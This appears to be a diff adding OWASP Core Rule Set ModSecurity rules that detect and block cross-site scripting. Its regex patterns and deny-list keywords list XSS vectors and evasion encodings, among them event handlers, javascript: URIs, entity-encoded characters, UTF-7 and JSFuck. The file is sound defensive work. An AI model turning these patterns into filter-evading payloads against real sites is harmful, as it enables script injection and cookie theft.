+	SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_HEADERS:User-Agent|REQUEST_HEADERS:Referer|ARGS_NAMES|ARGS|REQUEST_FILENAME|XML:/* "@rx (?i)<[^0-9<>A-Z_a-z]*(?:[^\s\x0b\"'<>]*:)?[^0-9<>A-Z_a-z]*[^0-9A-Z_a-z]*?(?:s[^0-9A-Z_a-z]*?(?:c[^0-9A-Z_a-z]*?r[^0-9A-Z_a-z]*?i[^0-9A-Z_a-z]*?p[^0-9A-Z_a-z]*?t|t[^0-9A-Z_a-z]*?y[^0-9A-Z_a-z]*?l[^0-9A-Z_a-z]*?e|v[^0-9A-Z_a-z]*?g|e[^0-9A-Z_a-z]*?t[^0-9>A-Z_a-z])|f[^0-9A-Z_a-z]*?o[^0-9A-Z_a-z]*?r[^0-9A-Z_a-z]*?m|d[^0-9A-Z_a-z]*?i[^0-9A-Z_a-z]*?a[^0-9A-Z_a-z]*?l[^0-9A-Z_a-z]*?o[^0-9A-Z_a-z]*?g|m[^0-9A-Z_a-z]*?(?:a[^0-9A-Z_a-z]*?r[^0-9A-Z_a-z]*?q[^0-9A-Z_a-z]*?u[^0-9A-Z_a-z]*?e[^0-9A-Z_a-z]*?e|e[^0-9A-Z_a-z]*?t[^0-9A-Z_a-z]*?a[^0-9>A-Z_a-z])|(?:l[^0-9A-Z_a-z]*?i[^0-9A-Z_a-z]*?n[^0-9A-Z_a-z]*?k|o[^0-9A-Z_a-z]*?b[^0-9A-Z_a-z]*?j[^0-9A-Z_a-z]*?e[^0-9A-Z_a-z]*?c[^0-9A-Z_a-z]*?t|e[^0-9A-Z_a-z]*?m[^0-9A-Z_a-z]*?b[^0-9A-Z_a-z]*?e[^0-9A-Z_a-z]*?d|a[^0-9A-Z_a-z]*?(?:p[^0-9A-Z_a-z]*?p[^0-9A-Z_a-z]*?l[^0-9A-Z_a-z]*?e[^0-9A-Z_a-z]*?t|u[^0-9A-Z_a-z]*?d[^0-9A-Z_a-z]*?i[^0-9A-Z_a-z]*?o|n[^0-9A-Z_a-z]*?i[^0-9A-Z_a-z]*?m[^0-9A-Z_a-z]*?a[^0-9A-Z_a-z]*?t[^0-9A-Z_a-z]*?e)|p[^0-9A-Z_a-z]*?a[^0-9A-Z_a-z]*?r[^0-9A-Z_a-z]*?a[^0-9A-Z_a-z]*?m|i?[^0-9A-Z_a-z]*?f[^0-9A-Z_a-z]*?r[^0-9A-Z_a-z]*?a[^0-9A-Z_a-z]*?m[^0-9A-Z_a-z]*?e|b[^0-9A-Z_a-z]*?(?:a[^0-9A-Z_a-z]*?s[^0-9A-Z_a-z]*?e|o[^0-9A-Z_a-z]*?d[^0-9A-Z_a-z]*?y|i[^0-9A-Z_a-z]*?n[^0-9A-Z_a-z]*?d[^0-9A-Z_a-z]*?i[^0-9A-Z_a-z]*?n[^0-9A-Z_a-z]*?g[^0-9A-Z_a-z]*?s)|i[^0-9A-Z_a-z]*?m[^0-9A-Z_a-z]*?a?[^0-9A-Z_a-z]*?g[^0-9A-Z_a-z]*?e?|v[^0-9A-Z_a-z]*?i[^0-9A-Z_a-z]*?d[^0-9A-Z_a-z]*?e[^0-9A-Z_a-z]*?o)[^0-9>A-Z_a-z])|(?:<[0-9A-Z_a-z][^\s\x0b/]*[\s\x0b/]|[\"'](?:[^\s\x0b/]*[\s\x0b/])?)(?:background|formaction|lowsrc|on(?:a(?:bort|ctivate|d(?:apteradded|dtrack)|fter(?:print|(?:scriptexecu|upda)te)|lerting|n(?:imation(?:cancel|end|iteration|start)|tennastatechange)|ppcommand|u(?:dio(?:end|process|start)|xclick))|b(?:e(?:fore(?:(?:(?:(?:de)?activa|scriptexecu)t|toggl)e|c(?:opy|ut)|editfocus|input|p(?:aste|rint)|u(?:nload|pdate))|gin(?:Event)?)|l(?:ocked|ur)|oun(?:ce|dary)|roadcast|usy)|c(?:a(?:(?:ch|llschang)ed|nplay(?:through)?|rdstatechange)|(?:ell|fstate)change|h(?:a(?:rging(?:time)?cha)?nge|ecking)|l(?:ick|ose)|o(?:m(?:mand(?:update)?|p(?:lete|osition(?:end|start|update)))|n(?:nect(?:ed|ing)|t(?:extmenu|rolselect))|py)|u(?:echange|t))|d(?:ata(?:(?:availabl|chang)e|error|setc(?:hanged|omplete))|blclick|e(?:activate|livery(?:error|success)|vice(?:found|light|(?:mo|orienta)tion|proximity))|i(?:aling|s(?:abled|c(?:hargingtimechange|onnect(?:ed|ing))))|o(?:m(?:a(?:ctivate|ttrmodified)|(?:characterdata|subtree)modified|focus(?:in|out)|mousescroll|node(?:inserted(?:intodocument)?|removed(?:fromdocument)?))|wnloading)|r(?:ag(?:drop|e(?:n(?:d|ter)|xit)|(?:gestur|leav)e|over|start)|op)|urationchange)|e(?:mptied|n(?:abled|d(?:ed|Event)?|ter)|rror(?:update)?|xit)|f(?:ailed|i(?:lterchange|nish)|o(?:cus(?:in|out)?|rm(?:change|input))|ullscreenchange)|g(?:amepad(?:axismove|button(?:down|up)|(?:dis)?connected)|et)|h(?:ashchange|e(?:adphoneschange|l[dp])|olding)|i(?:cc(?:cardlockerror|infochange)|n(?:coming|put|valid))|key(?:down|press|up)|l(?:evelchange|o(?:ad(?:e(?:d(?:meta)?data|nd)|start)?|secapture)|y)|m(?:ark|essage|o(?:use(?:down|enter|(?:lea|mo)ve|o(?:ut|ver)|up|wheel)|ve(?:end|start)?|z(?:a(?:fterpaint|udioavailable)|(?:beforeresiz|orientationchang|t(?:apgestur|imechang))e|(?:edgeui(?:c(?:ancel|omplet)|start)e|network(?:down|up)loa)d|fullscreen(?:change|error)|m(?:agnifygesture(?:start|update)?|ouse(?:hittest|pixelscroll))|p(?:ointerlock(?:change|error)|resstapgesture)|rotategesture(?:start|update)?|s(?:crolledareachanged|wipegesture(?:end|start|update)?))))|no(?:match|update)|o(?:(?:bsolet|(?:ff|n)lin)e|pen|verflow(?:changed)?)|p(?:a(?:ge(?:hide|show)|int|(?:st|us)e)|lay(?:ing)?|o(?:inter(?:down|enter|(?:(?:lea|mo)v|rawupdat)e|o(?:ut|ver)|up)|p(?:state|up(?:hid(?:den|ing)|show(?:ing|n))))|ro(?:gress|pertychange))|r(?:atechange|e(?:adystatechange|ceived|movetrack|peat(?:Event)?|quest|s(?:et|ize|u(?:lt|m(?:e|ing)))|trieving)|ow(?:e(?:nter|xit)|s(?:delete|inserted)))|s(?:croll(?:end)?|e(?:arch|ek(?:complete|ed|ing)|lect(?:ionchange|start)?|n(?:ding|t)|t)|how|(?:ound|peech)(?:end|start)|t(?:a(?:lled|rt|t(?:echange|uschanged))|k(?:comma|sessione)nd|op)|u(?:bmit|ccess|spend)|vg(?:abort|error|(?:un)?load|resize|scroll|zoom))|t(?:ext|ime(?:out|update)|o(?:ggle|uch(?:cancel|en(?:d|ter)|(?:lea|mo)ve|start))|ransition(?:cancel|end|run|start))|u(?:n(?:derflow|handledrejection|load)|p(?:dateready|gradeneeded)|s(?:erproximity|sdreceived))|v(?:ersion|o(?:ic|lum)e)change|w(?:a(?:it|rn)ing|ebkit(?:animation(?:end|iteration|start)|(?:playbacktargetavailabilitychange|transitionen)d)|heel)|zoom)|ping|s(?:rc|tyle))[\x08-\n\f\r ]*?="  "id:941160, phase:2, block, capture, t:none,t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls, msg:'NoScript XSS InjectionChecker: HTML Injection', logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}', tag:'application-multi', tag:'language-multi', tag:'platform-multi', tag:'attack-xss', tag:'xss-perf-disable', tag:'paranoia-level/1', tag:'OWASP_CRS', tag:'OWASP_CRS/ATTACK-XSS', tag:'capec/1000/152/242', ver:'OWASP_CRS/4.26.0-dev', severity:'CRITICAL', setvar:'tx.xss_score=+%{tx.critical_anomaly_score}', setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'"
+	SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_HEADERS:User-Agent|REQUEST_HEADERS:Referer|ARGS_NAMES|ARGS|REQUEST_FILENAME|XML:/* "@rx (?i)(?:\W|^)(?:javascript:(?:[\s\S]+[=\x5c\(\[\.<]|[\s\S]*?(?:\bname\b|\x5c[ux]\d))|data:(?:(?:[a-z]\w+/\w[\w+-]+\w)?[;,]|[\s\S]*?;[\s\S]*?\b(?:base64|charset=)|[\s\S]*?,[\s\S]*?<[\s\S]*?\w[\s\S]*?>))|@\W*?i\W*?m\W*?p\W*?o\W*?r\W*?t\W*?(?:/\*[\s\S]*?)?(?:[\"']|\W*?u\W*?r\W*?l[\s\S]*?\()|[^-]*?-\W*?m\W*?o\W*?z\W*?-\W*?b\W*?i\W*?n\W*?d\W*?i\W*?n\W*?g[^:]*?:\W*?u\W*?r\W*?l[\s\S]*?\("  "id:941170, phase:2, block, capture, t:none,t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls, msg:'NoScript XSS InjectionChecker: Attribute Injection', logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}', tag:'application-multi', tag:'language-multi', tag:'platform-multi', tag:'attack-xss', tag:'xss-perf-disable', tag:'paranoia-level/1', tag:'OWASP_CRS', tag:'OWASP_CRS/ATTACK-XSS', tag:'capec/1000/152/242', ver:'OWASP_CRS/4.26.0-dev', severity:'CRITICAL', setvar:'tx.xss_score=+%{tx.critical_anomaly_score}', setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'"
+	SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|REQUEST_FILENAME|XML:/* "@pm document.cookie document.domain document.querySelector document.body.appendChild document.write .parentnode .innerhtml window.location -moz-binding <!-- <![cdata["  "id:941180, phase:2, block, capture, t:none,t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls, msg:'Node-Validator Deny List Keywords', logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}', tag:'application-multi', tag:'language-multi', tag:'platform-nodejs', tag:'attack-xss', tag:'xss-perf-disable', tag:'paranoia-level/1', tag:'OWASP_CRS', tag:'OWASP_CRS/ATTACK-XSS', tag:'capec/1000/152/242', ver:'OWASP_CRS/4.26.0-dev', severity:'CRITICAL', setvar:'tx.xss_score=+%{tx.critical_anomaly_score}', setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'"
+	SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|REQUEST_FILENAME|XML:/* "@rx (?i)<style.*?>.*?(?:@[\x5ci]|(?:[:=]|&#x?0*(?:58|3[AD]|61);?).*?(?:[\(\x5c]|&#x?0*(?:40|28|92|5C);?))"  "id:941190, phase:2, block, capture, t:none,t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls, msg:'IE XSS Filters - Attack Detected', logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}', tag:'application-multi', tag:'language-multi', tag:'platform-internet-explorer', tag:'attack-xss', tag:'xss-perf-disable', tag:'paranoia-level/1', tag:'OWASP_CRS', tag:'OWASP_CRS/ATTACK-XSS', tag:'capec/1000/152/242', ver:'OWASP_CRS/4.26.0-dev', severity:'CRITICAL', setvar:'tx.xss_score=+%{tx.critical_anomaly_score}', setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'"
+	SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|REQUEST_FILENAME|XML:/* "@rx (?i:<.*[:]?vmlframe.*?[\s/+]*?src[\s/+]*=)"  "id:941200, phase:2, block, capture, t:none,t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls, msg:'IE XSS Filters - Attack Detected', logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}', tag:'application-multi', tag:'language-multi', tag:'platform-internet-explorer', tag:'attack-xss', tag:'xss-perf-disable', tag:'paranoia-level/1', tag:'OWASP_CRS', tag:'OWASP_CRS/ATTACK-XSS', tag:'capec/1000/152/242', ver:'OWASP_CRS/4.26.0-dev', severity:'CRITICAL', setvar:'tx.xss_score=+%{tx.critical_anomaly_score}', setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'"
+	SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|REQUEST_FILENAME|XML:/* "@rx (?i)(?:j|&#(?:0*(?:74|106)|x0*[46]A);)(?:[\t\n\r]|&(?:#(?:0*(?:9|1[03])|x0*[AD]);?|(?:tab|newline);))*(?:a|&#(?:0*(?:65|97)|x0*[46]1);)(?:[\t\n\r]|&(?:#(?:0*(?:9|1[03])|x0*[AD]);?|(?:tab|newline);))*(?:v|&#(?:0*(?:86|118)|x0*[57]6);)(?:[\t\n\r]|&(?:#(?:0*(?:9|1[03])|x0*[AD]);?|(?:tab|newline);))*(?:a|&#(?:0*(?:65|97)|x0*[46]1);)(?:[\t\n\r]|&(?:#(?:0*(?:9|1[03])|x0*[AD]);?|(?:tab|newline);))*(?:s|&#(?:0*(?:115|83)|x0*[57]3);)(?:[\t\n\r]|&(?:#(?:0*(?:9|1[03])|x0*[AD]);?|(?:tab|newline);))*(?:c|&#(?:x0*[46]3|0*(?:99|67));)(?:[\t\n\r]|&(?:#(?:0*(?:9|1[03])|x0*[AD]);?|(?:tab|newline);))*(?:r|&#(?:x0*[57]2|0*(?:114|82));)(?:[\t\n\r]|&(?:#(?:0*(?:9|1[03])|x0*[AD]);?|(?:tab|newline);))*(?:i|&#(?:x0*[46]9|0*(?:105|73));)(?:[\t\n\r]|&(?:#(?:0*(?:9|1[03])|x0*[AD]);?|(?:tab|newline);))*(?:p|&#(?:x0*[57]0|0*(?:112|80));)(?:[\t\n\r]|&(?:#(?:0*(?:9|1[03])|x0*[AD]);?|(?:tab|newline);))*(?:t|&#(?:x0*[57]4|0*(?:116|84));)(?:[\t\n\r]|&(?:#(?:0*(?:9|1[03])|x0*[AD]);?|(?:tab|newline);))*(?::|&(?:#(?:0*58|x0*3A);?|colon;))."  "id:941210, phase:2, block, capture, t:none,t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls, msg:'Javascript Word Detected', logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}', tag:'application-multi', tag:'language-multi', tag:'platform-internet-explorer', tag:'attack-xss', tag:'xss-perf-disable', tag:'paranoia-level/1', tag:'OWASP_CRS', tag:'OWASP_CRS/ATTACK-XSS', tag:'capec/1000/152/242', ver:'OWASP_CRS/4.26.0-dev', severity:'CRITICAL', setvar:'tx.xss_score=+%{tx.critical_anomaly_score}', setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'"
+	SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|REQUEST_FILENAME|XML:/* "@rx (?i)(?:v|&#(?:0*(?:118|86)|x0*[57]6);)(?:[\t\n\r]|&(?:#(?:0*(?:9|1[03])|x0*[AD]);?|(?:tab|newline);))*(?:b|&#(?:0*(?:98|66)|x0*[46]2);)(?:[\t\n\r]|&(?:#(?:0*(?:9|1[03])|x0*[AD]);?|(?:tab|newline);))*(?:s|&#(?:0*(?:115|83)|x0*[57]3);)(?:[\t\n\r]|&(?:#(?:0*(?:9|1[03])|x0*[AD]);?|(?:tab|newline);))*(?:c|&#(?:x0*[46]3|0*(?:99|67));)(?:[\t\n\r]|&(?:#(?:0*(?:9|1[03])|x0*[AD]);?|(?:tab|newline);))*(?:r|&#(?:x0*[57]2|0*(?:114|82));)(?:[\t\n\r]|&(?:#(?:0*(?:9|1[03])|x0*[AD]);?|(?:tab|newline);))*(?:i|&#(?:x0*[46]9|0*(?:105|73));)(?:[\t\n\r]|&(?:#(?:0*(?:9|1[03])|x0*[AD]);?|(?:tab|newline);))*(?:p|&#(?:x0*[57]0|0*(?:112|80));)(?:[\t\n\r]|&(?:#(?:0*(?:9|1[03])|x0*[AD]);?|(?:tab|newline);))*(?:t|&#(?:x0*[57]4|0*(?:116|84));)(?:[\t\n\r]|&(?:#(?:0*(?:9|1[03])|x0*[AD]);?|(?:tab|newline);))*(?::|&(?:#(?:0*58|x0*3A);?|colon;))."  "id:941220, phase:2, block, capture, t:none,t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls, msg:'IE XSS Filters - Attack Detected', logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}', tag:'application-multi', tag:'language-multi', tag:'platform-internet-explorer', tag:'attack-xss', tag:'xss-perf-disable', tag:'paranoia-level/1', tag:'OWASP_CRS', tag:'OWASP_CRS/ATTACK-XSS', tag:'capec/1000/152/242', ver:'OWASP_CRS/4.26.0-dev', severity:'CRITICAL', setvar:'tx.xss_score=+%{tx.critical_anomaly_score}', setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'"
+	SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|REQUEST_FILENAME|XML:/* "@rx (?i)<EMBED[\s/+].*?(?:src|type).*?="  "id:941230, phase:2, block, capture, t:none,t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls, msg:'IE XSS Filters - Attack Detected', logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}', tag:'application-multi', tag:'language-multi', tag:'platform-internet-explorer', tag:'attack-xss', tag:'xss-perf-disable', tag:'paranoia-level/1', tag:'OWASP_CRS', tag:'OWASP_CRS/ATTACK-XSS', tag:'capec/1000/152/242', ver:'OWASP_CRS/4.26.0-dev', severity:'CRITICAL', setvar:'tx.xss_score=+%{tx.critical_anomaly_score}', setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'"
+	SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|REQUEST_FILENAME|XML:/* "@rx <[?]?import[\s/+\S]*?implementation[\s/+]*?="  "id:941240, phase:2, block, capture, t:none,t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:lowercase,t:removeNulls, msg:'IE XSS Filters - Attack Detected', logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}', tag:'application-multi', tag:'language-multi', tag:'platform-internet-explorer', tag:'attack-xss', tag:'xss-perf-disable', tag:'paranoia-level/1', tag:'OWASP_CRS', tag:'OWASP_CRS/ATTACK-XSS', tag:'capec/1000/152/242', ver:'OWASP_CRS/4.26.0-dev', severity:'CRITICAL', setvar:'tx.xss_score=+%{tx.critical_anomaly_score}', setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'"
+	SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|REQUEST_FILENAME|XML:/* "@rx (?i)<META[\s\x0b\+/].*?http-equiv[\s\x0b\+/]*=[\s\x0b\+/]*[\"'`]?(?:[crs]|&#x?0*(?:6[37]|43|99|[578][23]|11[45]);?)"  "id:941250, phase:2, block, capture, t:none,t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls, msg:'IE XSS Filters - Attack Detected', logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}', tag:'application-multi', tag:'language-multi', tag:'platform-internet-explorer', tag:'attack-xss', tag:'xss-perf-disable', tag:'paranoia-level/1', tag:'OWASP_CRS', tag:'OWASP_CRS/ATTACK-XSS', tag:'capec/1000/152/242', ver:'OWASP_CRS/4.26.0-dev', severity:'CRITICAL', setvar:'tx.xss_score=+%{tx.critical_anomaly_score}', setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'"
+	SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|REQUEST_FILENAME|XML:/* "@rx (?i:<META[\s/+].*?charset[\s/+]*=)"  "id:941260, phase:2, block, capture, t:none,t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls, msg:'IE XSS Filters - Attack Detected', logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}', tag:'application-multi', tag:'language-multi', tag:'platform-internet-explorer', tag:'attack-xss', tag:'xss-perf-disable', tag:'paranoia-level/1', tag:'OWASP_CRS', tag:'OWASP_CRS/ATTACK-XSS', tag:'capec/1000/152/242', ver:'OWASP_CRS/4.26.0-dev', severity:'CRITICAL', setvar:'tx.xss_score=+%{tx.critical_anomaly_score}', setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'"
+	SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|REQUEST_FILENAME|XML:/* "@rx (?i)<LINK[\s/+].*?href[\s/+]*="  "id:941270, phase:2, block, capture, t:none,t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls, msg:'IE XSS Filters - Attack Detected', logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}', tag:'application-multi', tag:'language-multi', tag:'platform-internet-explorer', tag:'attack-xss', tag:'xss-perf-disable', tag:'paranoia-level/1', tag:'OWASP_CRS', tag:'OWASP_CRS/ATTACK-XSS', tag:'capec/1000/152/242', ver:'OWASP_CRS/4.26.0-dev', severity:'CRITICAL', setvar:'tx.xss_score=+%{tx.critical_anomaly_score}', setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'"
+	SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|REQUEST_FILENAME|XML:/* "@rx (?i)<BASE[\s/+].*?href[\s/+]*="  "id:941280, phase:2, block, capture, t:none,t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls, msg:'IE XSS Filters - Attack Detected', logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}', tag:'application-multi', tag:'language-multi', tag:'platform-internet-explorer', tag:'attack-xss', tag:'xss-perf-disable', tag:'paranoia-level/1', tag:'OWASP_CRS', tag:'OWASP_CRS/ATTACK-XSS', tag:'capec/1000/152/242', ver:'OWASP_CRS/4.26.0-dev', severity:'CRITICAL', setvar:'tx.xss_score=+%{tx.critical_anomaly_score}', setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'"
+	SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|REQUEST_FILENAME|XML:/* "@rx (?i)<APPLET[\s/+>]"  "id:941290, phase:2, block, capture, t:none,t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls, msg:'IE XSS Filters - Attack Detected', logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}', tag:'application-multi', tag:'language-multi', tag:'platform-internet-explorer', tag:'attack-xss', tag:'xss-perf-disable', tag:'paranoia-level/1', tag:'OWASP_CRS', tag:'OWASP_CRS/ATTACK-XSS', tag:'capec/1000/152/242', ver:'OWASP_CRS/4.26.0-dev', severity:'CRITICAL', setvar:'tx.xss_score=+%{tx.critical_anomaly_score}', setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'"
+	SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|REQUEST_FILENAME|XML:/* "@rx (?i)<OBJECT[\s\x0b\+/].*?(?:type|c(?:ode(?:type)?|lassid)|data)[\s\x0b\+/]*="  "id:941300, phase:2, block, capture, t:none,t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls, msg:'IE XSS Filters - Attack Detected', logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}', tag:'application-multi', tag:'language-multi', tag:'platform-internet-explorer', tag:'attack-xss', tag:'xss-perf-disable', tag:'paranoia-level/1', tag:'OWASP_CRS', tag:'OWASP_CRS/ATTACK-XSS', tag:'capec/1000/152/242', ver:'OWASP_CRS/4.26.0-dev', severity:'CRITICAL', setvar:'tx.xss_score=+%{tx.critical_anomaly_score}', setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'"
+	SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|REQUEST_FILENAME|XML:/* "@rx \x{bc}[^>\x{be}]*[>\x{be}]|<[^\x{be}]*\x{be}"  "id:941310, phase:2, block, capture, t:none,t:lowercase,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode, msg:'US-ASCII Malformed Encoding XSS Filter - Attack Detected', logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}', tag:'application-multi', tag:'language-multi', tag:'platform-tomcat', tag:'attack-xss', tag:'xss-perf-disable', tag:'paranoia-level/1', tag:'OWASP_CRS', tag:'OWASP_CRS/ATTACK-XSS', tag:'capec/1000/152/242', ver:'OWASP_CRS/4.26.0-dev', severity:'CRITICAL', chain"
+	SecRule MATCHED_VARS "@rx \x{bc}[\s\x0b]*/[\s\x0b]*[^>\x{be}]*[>\x{be}]|<[\s\x0b]*/[\s\x0b]*[^\x{be}]*\x{be}"  "setvar:'tx.xss_score=+%{tx.critical_anomaly_score}', setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'"
+	SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|REQUEST_FILENAME|XML:/* "@rx \+ADw-.*(?:\+AD4-|>)|<.*\+AD4-"  "id:941350, phase:2, block, capture, t:none,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode, msg:'UTF-7 Encoding IE XSS - Attack Detected', logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}', tag:'application-multi', tag:'language-multi', tag:'platform-internet-explorer', tag:'attack-xss', tag:'xss-perf-disable', tag:'paranoia-level/1', tag:'OWASP_CRS', tag:'OWASP_CRS/ATTACK-XSS', tag:'capec/1000/152/242', ver:'OWASP_CRS/4.26.0-dev', severity:'CRITICAL', setvar:'tx.xss_score=+%{tx.critical_anomaly_score}', setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'"
+	SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|REQUEST_FILENAME|XML:/* "@rx ![!+ ]\[\]"  "id:941360, phase:2, block, t:none, msg:'JSFuck / Hieroglyphy obfuscation detected', logdata:'Matched Data: Suspicious payload found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}', tag:'application-multi', tag:'language-multi', tag:'attack-xss', tag:'xss-perf-disable', tag:'paranoia-level/1', tag:'OWASP_CRS', tag:'OWASP_CRS/ATTACK-XSS', tag:'capec/1000/152/242/63', ver:'OWASP_CRS/4.26.0-dev', severity:'CRITICAL', setvar:'tx.xss_score=+%{tx.critical_anomaly_score}', setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'"
+	SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|ARGS|REQUEST_FILENAME|XML:/* "@rx (?:self|document|t(?:his|op)|window)[\s\x0b]*(?:/\*|[\)\[]).+?(?:\]|\*/)"  "id:941370, phase:2, block, t:none,t:urlDecodeUni,t:compressWhitespace, msg:'JavaScript global variable found', logdata:'Matched Data: Suspicious JS global variable found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}', tag:'application-multi', tag:'language-multi', tag:'attack-xss', tag:'xss-perf-disable', tag:'paranoia-level/1', tag:'OWASP_CRS', tag:'OWASP_CRS/ATTACK-XSS', tag:'capec/1000/152/242/63', ver:'OWASP_CRS/4.26.0-dev', severity:'CRITICAL', setvar:'tx.xss_score=+%{tx.critical_anomaly_score}', setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'"
+	SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|REQUEST_FILENAME|XML:/* "@rx (?i)\b(?:eval|set(?:timeout|interval)|new[\s\x0b]+Function|a(?:lert|tob)|btoa|(?:promp|impor)t|con(?:firm|sole\.(?:log|dir))|fetch)[\s\x0b]*[\(\{]"  "id:941390, phase:2, block, capture, t:none,t:htmlEntityDecode,t:jsDecode, msg:'Javascript method detected', logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}', tag:'application-multi', tag:'language-multi', tag:'platform-nodejs', tag:'attack-xss', tag:'xss-perf-disable', tag:'paranoia-level/1', tag:'OWASP_CRS', tag:'OWASP_CRS/ATTACK-XSS', tag:'capec/1000/152/242', ver:'OWASP_CRS/4.26.0-dev', severity:'CRITICAL', setvar:'tx.xss_score=+%{tx.critical_anomaly_score}', setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'"
